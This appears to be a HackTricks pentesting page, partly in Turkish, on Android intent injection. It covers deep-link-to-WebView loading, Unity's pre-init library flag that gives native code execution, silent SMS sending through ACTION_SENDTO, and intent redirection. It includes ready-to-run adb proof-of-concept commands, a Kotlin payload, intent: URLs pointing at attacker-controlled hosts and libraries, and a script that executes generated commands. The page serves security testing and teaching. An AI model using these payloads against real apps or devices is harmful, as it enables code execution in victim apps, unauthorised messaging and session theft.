# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection, saldırgan tarafından kontrol edilen Intents veya daha sonra Intents'e dönüştürülen verileri kabul eden bileşenleri suistimal eder. Android uygulama pentestleri sırasında çok yaygın iki desen şunlardır:

- Hazırlanmış extras'ları exported Activities/Services/BroadcastReceivers'a geçirip bunların daha sonra ayrıcalıklı, non-exported bileşenlere iletilmesi.
- Saldırgan kontrollü URL'leri internal WebViews veya diğer hassas sink'lere yönlendiren exported VIEW/BROWSABLE deep link'lerin tetiklenmesi.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
ve hedef Activity, `url` sorgu parametresini bir WebView'e iletiyorsa, uygulamayı rastgele uzak içeriği kendi WebView bağlamında görüntülemeye zorlayabilirsiniz.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS uygulamanın WebView profilinde çalıştırılır.
- Eğer JavaScript etkinse (varsayılan olarak veya kontrollerin yanlış sıralanması nedeniyle), açığa çıkan herhangi bir `@JavascriptInterface` nesnesini listeleyebilir/kullanabilir, WebView çerezlerini/yerel depolamayı çalabilir ve pivot yapabilirsiniz.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

Tekrarlayan bir hata, JavaScript'i (veya diğer izin verici WebView ayarlarını) nihai URL allowlist/verification bitmeden önce etkinleştirmektir. Eğer erken yardımcılar deep link’inizi kabul eder ve WebView önce yapılandırılırsa, son yüklemeniz daha sonraki kontroller hatalı veya çok geç olsa bile JavaScript zaten etkin olarak gerçekleşir.

What to look for in decompiled code:
- URL'yi farklı şekilde parse/split/rebuild eden birden fazla helper (tutarsız normalizasyon).
- `getSettings().setJavaScriptEnabled(true)` çağrılarının son host/path allowlist kontrolünden önce olması.
- Bir boru hattı örneği: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-based Android apps typically use `com.unity3d.player.UnityPlayerActivity` (or `UnityPlayerGameActivity`) as the entry Activity. Unity’s Android template treats a special Intent extra named `unity` as a string of command-line flags for the Unity runtime. When the entry Activity is exported (default in many templates), any local app – and sometimes a website if `BROWSABLE` is present – can supply this extra.

A dangerous, undocumented flag leads to native code execution during very early process initialization:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- The Intent extra `unity` Unity runtime flag'larına parse edilir.
- Supplying the pre-init flag Unity'yi allowed linker namespace path içinde saldırgan tarafından kontrol edilen bir ELF yoluna işaret ettirir (aşağıdaki kısıtlamalara bakın).

Conditions for exploitation
- The Unity entry Activity exported durumunda olmalıdır (varsayılan olarak genellikle true).
- For one-click remote via browser: giriş Activity ayrıca `android.intent.category.BROWSABLE` bildirir, bu sayede extras'lar bir `intent:` URL'sinden geçirilebilir.

Local exploitation (same device)
1) Payload ELF'i hedef uygulamanın okuyabildiği bir yola yerleştirin. En kolay yol: kötü amaçlı bir kütüphaneyi kendi saldırgan uygulamanızda paketleyip, saldırganın manifest'inde ayarlayarak `/data/app/.../lib/<abi>/` altında çıkarıldığından emin olmaktır:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Kurbanın Unity activity'sini `unity` extra içinde CLI pre-init flag ile başlatın. Örnek ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; payload'unuz hedef süreçte çalışır, uygulamanın tüm izinlerini (camera/mic/network/storage, vb.) ve uygulama içi oturumlara/verilere erişimi devralır.

Notes
- Tam `/data/app/...` yolu cihazlara/kurulumlara göre değişir. Bir saldırgan uygulama kendi native lib dizinini çalışma zamanında `getApplicationInfo().nativeLibraryDir` ile alabilir ve trigger'a iletebilir.
- Dosyanın `.so` ile bitmesi gerekmez eğer geçerli bir ELF ise — `dlopen()` ELF başlıklarıyla ilgilenir, uzantılarla değil.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Ancak modern Android'de dinamik linker ad alanları ve SELinux birçok herkese açık yoldan (ör. `/sdcard/Download`) yüklemeyi engeller. Aşağıdaki gibi hatalar görürsünüz:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

Bazı varsayılan mesajlaşma uygulamaları, implicit messaging intent'leri hatalı olarak otomatik yürütür ve bunları bir confused‑deputy primitive'ine dönüştürür: yetkisiz herhangi bir uygulama `Intent.ACTION_SENDTO`'yu `sms:`, `smsto:`, `mms:`, veya `mmsto:` ile tetikleyebilir ve onay UI'sı olmadan ve `SEND_SMS` izni olmadan anında gönderime neden olabilir.

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: Alıcıyı URI'de ayarlayın, mesaj metnini `"sms_body"` extra'sında verin.
- Permissions: none (no `SEND_SMS`), varsayılan SMS/MMS handler'ına dayanır.
- Observed: Google Messages for Wear OS (patched May 2025). Diğer handler'lar benzer şekilde değerlendirilmelidir.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (özel izin gerektirmez)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Saldırı yüzeyi genişlemesi (Wear OS)
- Any component capable of launching activities can fire the same payload: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- If the default handler auto‑sends, abuse can be one‑tap or fully silent from background contexts depending on OEM policies.

Pentest checklist
- Resolve `ACTION_SENDTO` on target to identify the default handler; verify whether it shows a compose UI or silently sends.
- Exercise all four schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) and extras (`sms_body`, optionally `subject` for MMS) to check behaviour differences.
- Consider charged destinations/premium‑rate numbers when testing on real devices.


## Other classic Intent injection primitives

- startActivity/sendBroadcast using attacker-supplied `Intent` extras that are later re-parsed (`Intent.parseUri(...)`) and executed.
- Exported proxy components that forward Intents to non-exported sensitive components without permission checks.

---

## Exported-component testlerini otomatikleştirme (Smali-driven ADB generation)

Exported bileşenler belirli extras bekliyorsa, payload yapısını tahmin etmek zaman kaybına ve false negatives sonuçlara neden olur. Anahtar/tip keşfini doğrudan Smali'den otomatikleştirebilir ve çalıştırmaya hazır adb komutları üretebilirsiniz.

Araç: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Yöntem: Smali'yi decompile edip `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` gibi çağrıları tarayarak her bileşenin hangi extras ve alanları tükettiğini çıkarın.
- Çıktı: her exported Activity/Service/Receiver/Provider için araç kısa bir açıklama ve doğru tiplenmiş flag'lerle tam `adb shell am ...`/`cmd content ...` komutunu yazdırır.

Kurulum
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Kullanım
```bash
python apk-components-inspector.py target.apk
```
Örnek çıktı
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras kısa başvuru (tür-bilinçli bayraklar)
- Stringler: `--es key value` | String array: `--esa key v1,v2`
- Tam sayılar: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleanlar: `--ez key true|false`
- Longlar: `--el key 1234567890`
- Floatlar: `--ef key 1.23`
- URI'ler (extra): `--eu key content://...` | Data URI (Intent verisi): `-d content://...`
- Bileşen extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Yaygın bayraklar: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Provider'lar için ileri ipuçları
- Ajanlar olmadan ContentProviders'a erişmek için `adb shell cmd content query|insert|update|delete ...` kullanın.
- SQLi probing için, alttaki provider SQLite-backed ise `--projection` ve `--where` (yani selection) değerlerini değiştirin.

Tam iş akışı otomasyonu (etkileşimli yürütücü)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>adb komutlarını ayrıştırıp çalıştırmak için yardımcı betik</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Cihaz üzerinde çalıştırın: inspector Python tabanlıdır ve `apktool`/`androguard` mevcut olan Termux veya rootlu telefonlarda çalışır.

---

## Intent Redirection (CWE-926) – bulma ve istismar etme

Desen
- Dışa açılmış bir giriş noktası (Activity/Service/Receiver) gelen bir Intent'i okur ve kaynağı/veriyi doğrulamadan dahili veya harici olarak iletir, örn.:
- `startActivity(getIntent())`
- `startActivity(intent)` burada `intent` `redirect_intent`/`next_intent`/`pending_intent` gibi bir extra'dan veya `Intent.parseUri(...)`'den gelmiştir.
- `action`/`data`/`component` alanlarına kontrol olmadan güvenme; çağıran kimliğini doğrulamama.

Smali/Java'da ne aranmalı
- `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)` kullanımları.
- Saldırgan etkisindeki Intent'ler üzerinde doğrudan `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` çağrıları.
- `getCallingPackage()`/`getCallingActivity()` kontrollerinin veya özel permission bariyerlerinin olmaması.

ADB PoC templates
- Proxy Activity ekstra bir Intent'i ayrıcalıklı bir dahili Activity'ye iletir:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- `redirect_intent` parcelable'ını dikkate alan Exported Service:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Doğrulama yapmadan ileten Exported Receiver:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
singleTask-style davranış için yararlı flags
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Gerçek dünya örnekleri (etki değişebilir):
- CVE-2024-26131 (Element Android): exported flows aracılığıyla WebView manipulation, PIN bypass ve login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → sistem düzeyinde etkiler.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access (kullanıcı etkileşimi ile).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents aracılığıyla içerik leak ediyor.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Kaynaklar

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
